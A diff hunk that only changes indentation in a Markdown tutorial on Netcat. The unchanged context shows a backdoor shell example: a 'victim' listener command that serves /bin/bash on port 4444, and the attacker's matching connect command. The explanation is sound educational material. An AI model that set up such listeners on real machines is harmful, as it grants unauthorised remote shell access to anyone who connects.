@@ -40,13 +40,13 @@ In a “traditional” Netcat installation you can use Netcat with the `-e` swit
 
 Here’s an example of a backdoor login shell using Netcat’s `-e` switch:
 
-  1. The victim machine (the Netcat listener at 192.168.55.73) runs the below command, which puts the victim machine into         listener mode on port 4444 and passes a shell to any machine that connects to it.
+1. The victim machine (the Netcat listener at 192.168.55.73) runs the below command, which puts the victim machine into         listener mode on port 4444 and passes a shell to any machine that connects to it.
 
 
     nc -l -p 4444 -e /bin/bash
 
 
-  2. The attacker machine (the Netcat client) runs the below command to connect to the victim machine (192.168.55.73) on       port 4444, which then receives the victim machine’s shell:
+ 2. The attacker machine (the Netcat client) runs the below command to connect to the victim machine (192.168.55.73) on       port 4444, which then receives the victim machine’s shell:
 
 
     nc 192.168.55.73 4444
